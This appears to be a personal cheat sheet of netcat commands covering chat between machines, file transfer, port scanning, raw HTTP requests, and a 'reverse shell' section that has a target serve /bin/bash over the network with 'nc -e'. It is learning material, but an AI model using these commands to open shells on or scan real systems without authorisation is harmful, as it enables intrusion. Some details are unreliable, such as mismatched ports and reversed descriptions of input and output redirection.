[ NET-CAT ]
------------------------------------------------------

- Establishing communication between 2 machines

Machine 1 : 

> nc -lp 8080 -vvv
[-lp : listening port]
[-vvv: verbose]

Machine 2 : 

> nc <machine1-IP> 8080 -v

------------------------------------------------------------

[ File sharing ]

Machine 1 : 

> nc -lp 9999 -v < data.txt
[< : standard output, sends file over tunnel]

Machine 2 :

> nc <machine1-IP> 8080 -v > file.txt
[> : standard input, recieves file ]

-------------------------------------------------------------

[ POrt Scanning ]

- Scans the given ports on specific IP provided

> nc -z <target-IP> 80 -v  							[single port]

> nc -z <target-IP> 80 22							[multiple port]

> nc -z <target-IP> 80-100 							[range of IP]

---------------------------------------------------------------------------

[ HTTP Request ]

> nc <domain-server> 80 -v 								--- sending the request from our end
GET /robots.txt HTTP/1.1
Host: <domain>

-------------------------------------------------------------------------------

[ Launching Reverse Shell Using NetCat ]

Machine 1: Target

> nc -lvp 9999 -e /bin/bash

Machine 2: Attcker

> nc <target-IP> 9999 -v

--------------------------------------------------------------------------------------

[ Privilege Escalation - Local ]

> uname -a 								--- to check the Os and Kernel Version

--------------------------------------------------------------------------------------
